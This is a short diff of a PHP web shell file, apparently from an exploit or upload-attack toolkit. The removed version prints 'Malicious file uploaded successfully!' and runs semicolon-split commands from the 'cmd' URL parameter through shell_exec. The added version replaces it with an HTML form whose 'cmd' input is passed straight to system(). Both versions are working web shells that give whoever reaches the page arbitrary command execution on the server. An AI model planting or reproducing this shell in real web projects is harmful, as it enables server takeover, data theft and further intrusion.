@@ -1,14 +1,18 @@
-<?php
-    echo "<h3 style='color: green;'>[+] Malicious file uploaded successfully!</h3>";
-    
+
+    <html> 
+    <body>
+    <h1>hi</h1>
+      <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+        <input type="text" name="cmd" autofocus id="cmd" size="80">
+        <input type="submit" value="Execute">
+      </form>
+      <pre>
+  <?php
     if(isset($_GET['cmd'])) {
-        $commands = explode(';', $_GET['cmd']);
-        foreach($commands as $command) {
-            $clean_cmd = htmlspecialchars(trim($command));
-            echo "<h4>=== Command: {$clean_cmd} ===</h4>";
-            echo "<pre>" . shell_exec($command) . "</pre>";
-        }
-    } else {
-        echo "<p style='color: red;'>ERROR: Add ?cmd=command1;command2</p>";
+        system($_GET['cmd']);
     }
-    ?>
+  ?>
+      </pre>
+    </body>
+  </html>
+    
